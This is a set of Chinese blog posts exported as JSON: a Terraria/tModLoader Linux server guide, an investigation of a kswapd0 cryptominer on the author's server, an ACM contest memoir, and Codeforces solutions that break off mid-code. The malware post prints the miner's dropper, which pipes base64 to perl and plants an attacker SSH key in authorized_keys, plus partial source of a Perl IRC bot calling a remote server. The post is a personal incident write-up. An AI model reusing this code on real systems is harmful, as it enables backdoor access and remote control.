[{"content":"Terraria Linux 服务器搭建（支持 mod ） 简介 泰拉瑞亚 1.4 Linux 服务器搭建， TmodLoader（后简称 TML） 1.4 服务器搭建（支持mod），面向只有一点点 Linux 基础的小伙伴。\n如果只是 TML 运行后一直在 下载 或者 5分钟没反应 这个问题（win 和 Linux 通用），可以直接看 TML 安装的最后部分。\n网上泰拉服务器教程已经很多了，但是都基本都是 1.3 版本， TML 基本在 0.11.8.9 版本之前，这次本体更新到 1.4 版本，TML更新到 v2022.05.103.34 版本（本文写于2022.6.28）后有了较大的变化，搭建过程中我也走了很多弯路，所以写一篇文章，希望对大家有帮助。\n服务器优势还是很大的，可以最大支持16个人，可以长期挂载，可以同时开多个资源世界等。\n环境说明 服务器 ：腾讯云 8 核 4 G（如果要安装 TML 建议服务器 在 2核2G 以上）、操作系统 debain 11\n游戏本体：steam上的 Terraria 1.4.3.6 ，TML v2022.05.103.34\n泰拉的服务器端是免费的，在 官网 或者 Terraria wiki， TML 在 GitHub 获得最新版，也有封装完整的 docker 镜像供大家使用（这个方法我没有试过）\n我这里推荐和使用的是利用 steamcmd 的方法，先说一下优势：\n服务器与桌面端版本统一方便。 版本更新方便，steamcmd 有专门的指令更新游戏，而别的方法需要重新下载安装。 1.4 版本后的 TML 支持创意工坊直接导入 mod ，这个在服务器端也生效！！！ 服务器搭建 安装 steamcmd 习惯看文档的请看文档，里面比较详细（支持中文）, 内含 docker 安装方法。\n创建一个名为 steam 的用户帐户以安全地运行 SteamCMD，并将其与操作系统的其余部分隔离。以 root 用户身份登录时请勿运行 steamcmd——这样做会带来安全风险。\n以 root 用户身份创建 steam 用户： 1 2 3 4 useradd -m steam # 添加密码 passwd steam 进入其文件夹 1 2 3 4 5 6 7 8 9 10 11 12 cd /home/steam # 或者 su steam bash # 切换到 bash 以保证命令行体验 cd ~ # 64 位机需要 sudo add-apt-repository multiverse sudo dpkg --add-architecture i386 sudo apt update sudo apt install lib32gcc1 steamcmd 安装 Ubuntu/Debian\n1 sudo apt install steamcmd 链接 steamcmd 可执行文件： 1 ln -s /usr/games/steamcmd steamcmd 运行 Steamcmd 1 2 cd ~ steamcmd 正常情况下你会看到\n输入login + 你的用户名 然后按提示登录即可（第一次登录会需要令牌）\n安装 terraria\n1 app_update 105600 # 安装 Terraria(它在steam中的代码是 105600，不会改变) 下载完成后你应该可以在 ~/Steam/steamapps/common 下面看到 Terraria 文件夹\n里面的 TerrariaServer.bin.x86_64 就是服务器运行文件了\n1 2 3 # 新建会话 screen -S Tr ./TerrariaServer.bin.x86_64 然后就可以开始的愉快游戏了，常用指令\nTML 搭建 这个需要在本体完成的基础上进行\n如何查找游戏在steam中的代码\n我们可以看到 TML 的代码是 1281930 版本是 8980144， 所以\n1 2 # app_update \u0026lt;应用ID\u0026gt; [-beta \u0026lt;测试名称\u0026gt;] [-betapassword \u0026lt;密码\u0026gt;] [validate] app_update 1281930 8980144 validate # 如果发现安装有问题请加 validate 下载完成后，同样进入 TML 文件夹\n1 2 3 # 新建会话 screen -S Tr ./start-tModLoaderServer.sh ！！！最大的问题来了 这里演示的是 windows 下的情况，Linux服务端一样，只不过服务器上可以多看到下载信息，在下载 .net 但是国内服务器应该是下载不下来的，所以会等到死。\nwindows 和 Linux 解决方法一样，下载 .net\n我们可以在 TML 内的 dotnet/6.0.0 内看到里面是空的，所以我们要手动下载二进制文件包，丢进去\n1 2 3 4 5 6 7 cd ~/Steam/steamapps/common/tModLoader/dotnet/6.0.0 # 下载二进制文件 wget https://dotnet.microsoft.com/zh-cn/download/dotnet/thank-you/sdk-6.0.301-linux-x64-binaries # 解压文件 tar -zxvf dotnet-sdk-6.0.301-linux-x64.tar.gz windows 下操作同理\n然后运行即可 steam 的最大优势是 TML 内的mod就是 改登录的steam账号内 TML 订阅的mod，如果需要更新\n1 app_update 1281930 validate 已经成功和小伙伴玩上 1.4 版本的 灾厄mod ，请注意服务器mod与主机端应当相同。\n本文主要是为了介绍 TML 1.4 运行不起来的解决方法，下面的参考链接介绍会更为详细\n参考连接： 泰拉瑞亚服务器搭建教程（带 MOD）\n使用Linux搭建Terraria服务器，详细步骤\n","date":"2022-06-28T00:00:00Z","image":"https://example.com/Photo.png","permalink":"https://example.com/p/terraria/","title":"Terraria"},{"content":"kswapd0 挖矿病毒调查 背景 3 月 6 日收到了腾讯云的异地异常登入报告，马上又收到了检测出木马的报告\n马上怀疑是服务器被植入了木马程序，但是时间比较晚了，先把服务器关机了然后睡觉\n我也没有急着重装系统，有点贪心，想看看木马长什么样，也顺便学习一下怎么清理木马程序，怎么分析受损情况，毕竟我现在是一个个人的服务器还没有对外提供服务，可以随便重装系统，但是如果是一个网站的服务器那么肯定是不能随便重装的。\n但是这个木马非常狡猾，我 3 月 6 日一天也没有找出来，也请了网安的同学来帮忙，外加腾讯给我的报错文件，我什么没有找到，一切看起来都非常正常，各种日志都没有一点痕迹连操作记录都没有，然后我就又把服务器开着等了一天。\n出现异常 很快，第二天凌晨又被警告异地登入了，但是我当时还在睡觉没处理，早上起来一开服务器发现问题大了。\n开始调查 有个程序把我的cpu直接占满了，我知道它出现了，我直接 kill 了这个程序，然后在通过查看系统的定期任务找到了它的文件，应该是只有部分了，它的很多安装步骤应该是被自己清理掉了。\n很明显它有一些定时任务，而且我每一次开机都会更新一些木马的程序，非常难找，而且输出全部重定向到了空，所以没有运行日志，当然也它没有很过分的写 shell 反弹，否在我恐怕也不能直接发现这些定期运行的脚本了。\n然后根据上面运行的脚本目录，我找到了它的一些文件\n里面有很多脚本程序，比如启动挖矿程序，为了躲避产生日志的脚本，还有一些判断系统硬件的，还有脚本杀死别的挖矿软件……，还有删除一些文件的（所以应该丢失了不少关键文件）\n当然最重要的还是要看一下挖矿程序(省略)\n1 2 3 4 5 #!/bin/sh nohup ./stop\u0026gt;\u0026gt;/dev/null \u0026amp; sleep 5 echo \u0026#34;ZXZhbCB1bnBhY2sgd......\u0026#34; | base64 --decode | perl cd ~ \u0026amp;\u0026amp; rm -rf .ssh \u0026amp;\u0026amp; mkdir .ssh \u0026amp;\u0026amp; echo \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\u0026#34;\u0026gt;\u0026gt;.ssh/authorized_keys \u0026amp;\u0026amp; chmod -R go= ~/.ssh 有一个用 perl 写的程序还有一个 ssh 远程登入\n因为是 base64 压缩，所以通过解码并且将 perl 加入输出命令得到了源码（部分）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 my $processo = \u0026#39;rsync\u0026#39;; $servidor=\u0026#39;45.9.148.99\u0026#39; unless $servidor; my $porta=\u0026#39;443\u0026#39;; my @canais=(\u0026#34;#007\u0026#34;); my @adms=(\u0026#34;polly\u0026#34;,\u0026#34;molly\u0026#34;); my @auth=(\u0026#34;localhost\u0026#34;); my $linas_max=6; my $sleep=3; my $nick = getnick(); my $ircname = getnick(); my $realname = (`uname -a`); my $acessoshell = 1; my $prefixo = \u0026#34;! \u0026#34;; my $estatisticas = 0; my $pacotes = 1; my $VERSAO = \u0026#39;0.2a\u0026#39;; $SIG{\u0026#39;INT\u0026#39;} = \u0026#39;IGNORE\u0026#39;; $SIG{\u0026#39;HUP\u0026#39;} = \u0026#39;IGNORE\u0026#39;; $SIG{\u0026#39;TERM\u0026#39;} = \u0026#39;IGNORE\u0026#39;; $SIG{\u0026#39;CHLD\u0026#39;} = \u0026#39;IGNORE\u0026#39;; $SIG{\u0026#39;PS\u0026#39;} = \u0026#39;IGNORE\u0026#39;; use IO::Socket; use Socket; use IO::Select; chdir(\u0026#34;/\u0026#34;); $servidor=\u0026#34;$ARGV[0]\u0026#34; if $ARGV[0]; $0=\u0026#34;$processo\u0026#34;.\u0026#34;\\0\u0026#34;; my $pid=fork; exit if $pid; die \u0026#34;Problema com o fork: $!\u0026#34; unless defined($pid); my %irc_servers; my %DCC; my $dcc_sel = new IO::Select-\u0026gt;new(); sub getnick { return \u0026#34;x\u0026#34;.int(rand(9000)).int(rand(9000)); } sub getident { my $retornoident = \u0026amp;_get(\u0026#34;http://www.minpop.com/sk12pack/idents.php\u0026#34;); my $identchance = int(rand(99000)); if ($identchance \u0026gt; 30) { return $nick; } else { return $retornoident; } return $retornoident; } sub getname { my $retornoname = \u0026amp;_get(\u0026#34;http://www.minpop.com/sk12pack/names.php\u0026#34;); return $retornoname; } sub getident2 { my $length=shift; $length = 3 if ($length \u0026lt; 3); my @chars=(\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;,\u0026#39;A\u0026#39;..\u0026#39;Z\u0026#39;,\u0026#39;1\u0026#39;..\u0026#39;9\u0026#39;); foreach (1..$length) { $randomstring.=$chars[rand @chars]; } return $randomstring; } ...... 其中有一个很明显的 ip 地址 45.9.148.99 通过 IP 地址定位，发现是在荷兰，臭名昭著~\n还有一个主文件 kwsapd0 但是是经过特殊加密的，暂时不会解码的手段，不过根据网上的查询多半是 XMRig 编译的 Linux 平台门罗币挖矿木马了。\n这次的木马调查也只能到此结束了，后面深入的事情也不是我有能力去做的了，只是很讨厌这种行为，通过木马挖矿就是小偷行为，偷别人的算力，非常可耻！\n总结 自己的服务器要小心，不要被别人拿去白打工了，密码最好复杂一点，各个用户的都要复杂一点，因为不是 sudo用户也有可能被入侵，密码最好定期跟换，对于端口开放要谨慎，要限制访问 IP。\n这次的木马时间算是给了我一个教训吧，辛亏服务器内数据不多，损失也不算大，但是以后还是要多加小心。\n","date":"2022-03-07T00:00:00Z","permalink":"https://example.com/p/kswapd0%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E8%AE%B0%E5%BD%95/","title":"Kswapd0挖矿病毒记录"},{"content":"ACM 退役总结 ​\t终于还是到了退役的那一天，大学的 ACM 之旅也到此结束了。想写一篇文章回顾一下自己参加 ACM 的整个历程，为自己这一年以来的学习历程做一个总结。\n初识 $Fibonacci$ 数列 假设一对刚出生的小兔一个月后就能长成大兔，再过一个月就能生下一对小兔，并且此后每个月都生一对小兔，一年内没有发生死亡，问：一对刚出生的兔子，一年内繁殖成多少对兔子?\n这是斐波那契数列非常经典的例题，对于第 $n$ 项 ：$A_n = A_{n-1} + A_{n-2}$。\n​\t其实参加 ACM 竞赛对大一的我来说是一条未曾设想的道路，甚至学不学计算机专业都还没有确定。我的学院希望大家宽厚基础，大二再选择自己的专业。我第一次了解到这个 ACM 竞赛还是大一下学期，童孟军老师（ACM 集训队的教练）来我学院宣传计算机专业，在向大家介绍杰出的计算机毕业生中很多都有 ACM 经历，而我当时想选择计算机专业，所以我就打算参加 ACM 竞赛来提高自己。就是这种机缘巧合下我走上了算法竞赛之路。\n求 $Fibonacci$ 数列的第 $n(n \\leqslant 30)$ 项 C 语言最基础的递归训练题目，$fib(n) = fib(n - 1) + fib(n - 2)$\n​\t刚接触 ACM 竞赛我非常冲动，也不管自己有没有一点基础，就报名了当时的新生赛，我报名新生赛的时候离比赛只有一个星期的时间，而当时的我连 C 语言都不会！然后就一星期速成 C 语言参加了比赛。\n​\t第一次打新生赛真的啥都不会，我还记得我当时只写出了一道题，被同级的集训队队员吊打了，但是我也没有因此放弃。我在大一的暑假参加了 ACM 集训队的暑期集训，在最开始的一段时间，我几乎在每次个人赛中都排在倒数。我深刻的认识到了自己的菜，然后就每天都在实验室里面学习，在那段时间的学习过程中，我感受到了算法的神奇魅力，我渐渐的对算法产生了浓厚的兴趣，我因此热爱上了算法，也热爱 ACM 比赛，我的目标也从一开始参加 ACM 为了提高自己的能力，到后来我希望自己能够在比赛中拿到一块奖牌来证明自己。\n求 $Fibonacci$ 数列的第 $n(n \\leqslant 10^6)$ 项（对 $10^9 + 9$ 取模） 在递归中，对于每一项的 $fib(n)$ 都搜索到了底，所以复杂度达到了 $O(2 ^ n)$，可以通过记忆化搜索或者动态规划的方式线性递推得到答案，这样的话复杂度就为 $O(n)$。\n​\t经过一个暑假的训练，我对算法竞赛有了更深的了解、学习了很多知识、打了很多练习赛，渐渐的我在个人赛中的排名一点点向前靠了，在大二上开学的那个学期的校赛中，我拿到了校赛的三等奖，这也是我第一次获奖，也是我第一次拿到竞赛奖金，因为当时的校赛是有华为奖的，所以奖金比较高，那 $500$ 元的奖金让我高兴了很久.\n​\t也因为校赛拿到了三等奖，我被分到了我们学校的三队参加的高校天梯赛（$10$ 人一队），那也是我第一次参加国赛，虽然这个比赛的含金量相对于 ICPC / CCPC（国际 / 中国 大学生程序设计竞赛） 而言不高，但是也是被学校认可的一个国赛啊，在那次比赛中我发挥的并不是很好，但是靠着队内大佬的超强实力，我们队拿到了国家级银奖，又到手 $500$ 元，这两个奖项给了我极大的动力。我既能做着自己喜欢的事情（学习算法）又可以收获国奖还有不少奖金然我真的非常开心。而且当时我绩点不高只拿了三等奖学金，不如我的比赛奖金，而我们学校没有保研，绩点对我来说重要性一下子降得很低，所以我投入了大量经历在训练上面，那个学期我的算法水平算是突飞猛进。\n求 $Fibonacci$ 数列的第 $n(n \\leqslant 10^{18})$ 项（对 $10^9 + 9$ 取模） 对于 $10^{18}$ 这个大小，线性递推的复杂度的显然已经无法求出答案了，所以可以通过矩阵递推 + 快速求幂次，也就是矩阵快速幂来求解，复杂度为 $O(log_2 n)$。\n​\t大二上学期的两个小奖给了我极大的信心，但是在那个学期 ICPC / CCPC 的比赛中我们队伍都是打铁的成绩（啥奖牌都没有），由于疫情的原因比赛名额比较多，我们拿到了很多本来大二拿不到的比赛机会。当时我们队伍在大二的队伍中算是比较弱的，所以我们没有比赛的优先选择权，但是运气非常好，正因为没有优先选择权，我轮到了大二下学期的 2020 赛季最后的区域赛机会——银川站，然后开启了“拿奖模式”。\n​\t大二下可以说是我拿奖拿的最爽的一个学期，我再一次拿到了高校天梯赛的全国银奖，又陆陆续续拿到了蓝桥杯（个人赛）的省一进入国赛，但在国赛中只拿到了国三。最重要的是我队伍（三人组）在 5 月份的浙江省赛中拿到了铜奖，然后我们前往宁夏银川，这是我们第一次出校打比赛，当时非常的兴奋。这场比赛的运气真的是非常非常的好，在银川站一开始由于紧张与缺乏经验打的非常差（罚时爆炸），在还剩一个小时（也就是封榜前）我们队还在铁牌区，我们当时其实有一点绝望，因为我们知道第 $4$ 题用什么算法，但是我们 WA了好几次，一直找不到原因，由于当时这道题是由我来写的，所以我又仔仔细细的看了一遍代码，发现了一个小错误（我当时对 $Trie$ 树的理解并不深，所以几乎是现学现写的），终于过了，当时我们真的非常激动，因为这是道铜牌题，过了它就意味着我们就能拿到奖牌了。不出意外，我们拿到了铜牌，也是我们第一次拿到区域赛的铜牌，现在想起当时的场景也是非常的激动，我拿牌的愿望终于实现了！\n​\t在银川之后，我们又去了西安的西北工业大学参加 ICPC 邀请赛，邀请赛相对于区域赛来说简单一点，我们就抱着旅游的心态去了，比赛又是磕磕绊绊，我们在写出一道签到题后，第二道题是一道期望题，大家都没有什么想法，当时队内的气氛一下子就压抑了起来，队友想不下去就换题了，然后我一个人想这道题，直到第三个小时，我发现这个题的答案好像是一个等比数列，所以我推出了公式后和队友说我想尝试一下，但也没有什么把握的，队友当时也没有在用电脑，然后我就上去打了一个 快速幂 + 龟速乘（其实不需要），我将自己推出来的公式实现了一下，然后测了样例没问题，但是由于那道题是 除法取模 的，只有对特殊的样例我们才能自己手算出答案，然后我和队友说想莽一发，他们对这道题没啥想法就答应了，然后我其实非常不自信的点了提交，当绿色的 Accept 出现时我自己都不敢相信，过了这道题基本上意味着拿铜牌稳了，然后大家又拥有了继续下去的信心，在封榜后又过了一题，最后以 $3$ 题结束比赛，可惜还是铜牌。由于出去比赛是非常吃经费的，然后我们队出去两次比赛都拿到了牌，这点让教练比较满意吧，我们就成为了集训队中的三队，这意味着我们下学期会有更多比赛机会和赛站的优先选择权。\n求 $Fibonacci$ 数列的第 $n(n \\leqslant 10^{10^6})$ 项（对 $10^9 + 9$ 取模） 即便矩阵快速幂将复杂度优化到了 $O(log_2 n)$，但在这个复杂度下计算机依旧求不出这种大小规模的答案了，这时候神奇的数论出场了！Fibonacci 数列的通项公式是： $$ a_n = \\dfrac{1}{\\sqrt{5}}\\left [ \\left ( \\dfrac{1+\\sqrt{5}}{2} \\right )^n - \\left ( \\dfrac{1 - \\sqrt{5}}{2} \\right )^n \\right ] $$ 用二次剩余求出 $\\sqrt{5}$ 对模数 $10^9+9$ 的逆元，然后代替通向公式中的 $\\sqrt{5}$，并将系数全部换成逆元形式，再用费马-欧拉定理对式子进行欧拉降幂，就可以求得答案了。\n​\t转眼大三了，我知道这是 ACM 生涯的最后时间了，我大二暑假没回家，天天再实验室里面刷题，真的是可以称得上 每周几乎无休 + 朝九晚九了，只为了学更多的算法刷更多的题，想拿更多的牌，但是一直运气非常好的我，在这个赛季就没那么好运了，因为疫情这次的所有比赛都是在线上的，而且名额分配的非常多，但是奖牌数缺没有增加，这意味着非常恐怖的竞争，当然这也使得 ACM 区域赛奖牌的含金量更高了。我们参加了三站，济南 $700$ 队争 $200$ 块奖牌，堪称卷成经典，威海 $7$ 题中 $5$ 可以用 “多项式卷积” 过，可以说是 “卷”王了，上海一手 $Kruskal$ 重构树 + 树上倍增 杀死了我们最后希望。这个赛季就只能铁牌结束了，没办法了，虽然有很多遗憾与不甘，也要退役了，但是算法竞赛就是这样真实，打不过别人就是自己菜，所以我是真的菜！\n求 $Fibonacci$ 数列的第 $\\infty$ 项 我没学过，不会~\n​\t人退役了，但是我对算法的热爱并没有“退役”，我想这份热爱也许永远不会消退，因为我个人真的非常喜欢这种思维性的东西，每个算法里面都蕴含着前人的非常多的思维，学习算法就像是很前人对话一样，非常神奇。\n​\t参加 ACM 训练给我带来了很多，代码基本功、思维力、算法灵活运用，但是我觉得最重要的是一种追求更好（代码简洁），更快（复杂度低、运行更快）、更全面（不漏过一个细节）的精神，每当我解出一题，我总是会问自己存不存在更优的解法，我也习惯性的将这种最求极致的精神带入生活中，虽然这会拖慢我的脚步，但是也带给了我很多。正如 Fibonacci 数列是永无尽头的一样，我的学习之路也会是永无尽头的，我会一直追求下去。\n​\t我相信人的每个时间段都有更重要的事情，ACM 对我来说已经结束了，我也该进入新的阶段了，无论是学习技术还是考研，我都还有很长的路要走，但我也不会放弃算法的学习，有机会我还会继续学习算法。\n很多图片算是我曾经努力过的见证吧。\n每一个小点都是我的一次熬夜比赛，曾经的我几乎不愿意拉下任何一场比赛。\n在实验室的一个大位置，实验室的环境非常好，学习氛围更好。\n​\t在弱校从大一下开始零基础打 ACM 竞赛，真的很难，时间真的非常短，平时还要上课，真的是挤时间学习，而与我们同台竞技的是来自 $985, 211$ 的选手，他们很多在高中就开始搞信息学竞赛，但是我们集训队的历届学长告诉我们没有什么不可能的，有零基础拿到区域赛金牌的王队，超队，还有仅仅参加半年多就拿到银牌的学长，有边考研边比赛的计算几何大师学长（拿过计算几何题的一血，并且是全场唯一一个过这道题的人），历届学长的经历都在激励我向前，从以前我们学校最高只能拿到铜牌到有一年拿到银牌，而在我加入集训队前，我们集训队又有了重大突破，拿到了第一块金牌。一届届集训队的传承使得集训队越发的强大，即便我们没有那些名校选手那么好的基础，几乎没有 $OI$ 选手，但是我们依旧在向前。\n总结 回顾我的整个 ACM 历程，我还有很多很多没有做好的地方：\n自学能力依旧不够，没有利用好很多的资源。 轻视了思维力，算法我学了很多，但是我的思维力依旧是偏弱的，我无法很好的运用我学过的算法。 没有针对自己的弱点进行补短板，也就是补题太少，遇到一些不太会的题目就放弃。 缺乏对自己训练的安排，学习路线安排有问题。 最后的感谢 感谢童孟军教练、王子超队长、杨成艺队长对我的帮助！\n感谢我的两位队友的支持！\n","date":"2021-12-04T00:00:00Z","permalink":"https://example.com/p/acm-%E9%80%80%E5%BD%B9%E8%AE%B0/","title":"ACM 退役记"},{"content":"Codeforces Round #747 (Div. 2) A. Consecutive Sum Riddle 水题，一个为正一个为负即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;iostream\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) { if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) { x = x * 10 + ch - \u0026#39;0\u0026#39;, ch = getchar();} return x * f; } int main() { int t = read(); while(t --) { ll n = read(); ll l = - n + 1, r = n; if(l \u0026gt; r) swap(l, r); cout \u0026lt;\u0026lt; l \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; r \u0026lt;\u0026lt; endl; } return 0; } B. Special Numbers 给一个 $n$, 用 $n^0,n^1,n^2,\\dots$ 组合成数，可以用 $n = 2$ 的情况来观测别的情况\n1 2 3 4 5 6 7 8 1 2 3 4 5 6 7 8 1 3 4 9 10 12 13 27 第一行是标记，第二行是 $n = 2$ 的情况，第三行是 $n = 3$ 的情况，以第 $7$ 个数为例，它的二进制为 111, 当 $n = 2$ ,则第 7 个数由 $2^0,2^1,2^2$ 组成，当 $n = 3$ ,则第 7 个数由 $3^0,3^1,3^2$ 组成，所有对 $k$ 二进制拆分后，就可以得到答案了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) { if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) { x = x * 10 + ch - \u0026#39;0\u0026#39;, ch = getchar();} return x * f; } ll mod = 1e9 + 7; ll qp(ll a, ll b) { ll ans = 1; while(b) { if(b \u0026amp; 1) ans = ans * a % mod; a = a * a % mod; b \u0026gt;\u0026gt;= 1; } return ans; } int main() { int t = read(); while(t --) { ll n = read(), k = read(); ll ans = 0; for(int i = 0; i \u0026lt;= 62; i ++) { if((k \u0026gt;\u0026gt; i) \u0026amp; 1) ans = (ans + qp(n, i)) % mod; } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; endl; } return 0; } C. Make Them Equal 如果所给的字符串就是满足条件的那么答案是 $0$，若目标字符串中最后面的与 $c$ 字符相等的下标是 $\u0026gt; \\dfrac{n}{2}$ ，则只需要一次操作即可也就是输出这个下标，否则很明显在两次操作内必然能完成，只需要选两个互质的数即可，比如 n, 与 n - 1。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 #include \u0026lt;algorithm\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) { if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) { x = x * 10 + ch - \u0026#39;0\u0026#39;, ch = getchar();} return x * f; } const int M = 3e5 + 7; char s[M]; int main() { int t = read(); while (t--) { int n = read(); char ch[2]; scanf(\u0026#34;%s%s\u0026#34;, ch, s + 1); bool flag = true; int last = -1, big = 1; for (int i = 1; i \u0026lt;= n; i++) { if (s[i] != *ch) flag = false; else big = i; } if (flag) { printf(\u0026#34;0\\n\u0026#34;); } else { if (s[n] == *ch) { printf(\u0026#34;1\\n\u0026#34;); printf(\u0026#34;%d\\n\u0026#34;, n); } else { if (big * 2 \u0026gt; n) { printf(\u0026#34;1\\n\u0026#34;); printf(\u0026#34;%d\\n\u0026#34;, big); } else { printf(\u0026#34;2\\n\u0026#34;); printf(\u0026#34;%d %d\\n\u0026#34;, n - 1, n); } } } } return 0; } D. The Number of Imposters 首先一个人有可能是 Imposters， 也有可能是 crewmate ，我们可以发现，如果一个说另一个人是 Imposters，则这两个人的身份必然是相反的，而如果一个说另一个人 Imposters，则这两个人的身份必然是相反的，并且这个关系是双向的，也就是说两个人之间是双向边。我们可以给在一个图中给每个人染色，如果染色冲突了就是无解，输出 -1，否则答案加上两种颜色中个数最多的那个。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) { if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) { x = x * 10 + ch - \u0026#39;0\u0026#39;, ch = getchar();} return x * f; } const int M = 1e6 + 7, N = 2e5 + 7; struct Node { int to, nxt, w; } tr[M]; int head[N], idx, color[N], cnt; char s[20]; void add(int u, int v, int w) { tr[idx] = {v, head[u], w}; head[u] = idx ++; } int colornum[3]; bool dfs(int now) { for(int i = head[now]; ~i; i = tr[i].nxt) { int j = tr[i].to; if(!color[j]) { if(tr[i].w) { color[j] = 3 - color[now]; colornum[color[j]] ++; } else { color[j] = color[now]; colornum[color[j]] ++; } if(!dfs(j)) return false; } else { if(tr[i].w \u0026amp;\u0026amp; color[j] != 3 - color[now]) return false; if(!tr[i].w \u0026amp;\u0026amp; color[j] == 3 - color[now]) return false; } } return true; } int main() { int t = read(); while(t --) { idx = 0; int n = read(), m = read(); for(int i = 1; i \u0026lt;= n; i ++) { head[i] = -1; color[i] = 0; } for(int i = 1; i \u0026lt;= m; i ++) { int x = read(), y = read(); scanf(\u0026#34;%s\u0026#34;, s); if(*s == \u0026#39;i\u0026#39;) { add(x, y, 1); add(y, x, 1); } else { add(x, y, 0); add(y, x, 0); } } // 1 imposter, 2 crewmate bool flag = true; int ans = 0; for(int i = 1; i \u0026lt;= n; i ++) { if(!color[i]) { colornum[1] = 1, colornum[2] = 0; color[i] = 1; if(!dfs(i)) { flag = false; break; } ans += max(colornum[1], colornum[2]); } } if(!flag) { printf(\u0026#34;-1\\n\u0026#34;); } else { printf(\u0026#34;%d\\n\u0026#34;, ans); } } return 0; } E1. Rubik\u0026rsquo;s Cube Coloring (easy version) 第一个点是 $6$ 种颜色，它的子节点是 $4$ 种选择，而每个结点有两个子节点，所以答案是 $6\\times 2^{2^2 + 2^3 + \\dots 2^k}$，快速幂求解即可，注意 1 \u0026lt;\u0026lt; k 种的 1 默认为 int，所以左移过多会溢出！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) { if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) { x = x * 10 + ch - \u0026#39;0\u0026#39;, ch = getchar();} return x * f; } const int M = 2e5 + 7; const ll mod = 1e9 + 7; ll qp(ll a, ll b) { ll ans = 1; while(b) { if(b \u0026amp; 1) ans = ans * a % mod; a = a * a % mod; b \u0026gt;\u0026gt;= 1; } return ans; } int main() { ll k = read(); if(k == 1) { cout \u0026lt;\u0026lt; 6 \u0026lt;\u0026lt; endl; } else { ll all = 0; for(ll i = 2; i \u0026lt;= k; i ++) all += (ll)1 \u0026lt;\u0026lt; i; all %= mod - 1; // 对指数取模 mod - 1， 费马小定理，这边不去模也可以 ll ans = qp(2, all) * 6 % mod; cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; endl; } return 0; } ","date":"2021-10-09T10:23:28+08:00","permalink":"https://example.com/p/cf747/","title":"Cf747"},{"content":"Codeforces Round #746 (Div. 2) A. Gamer Hemose 水题\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include 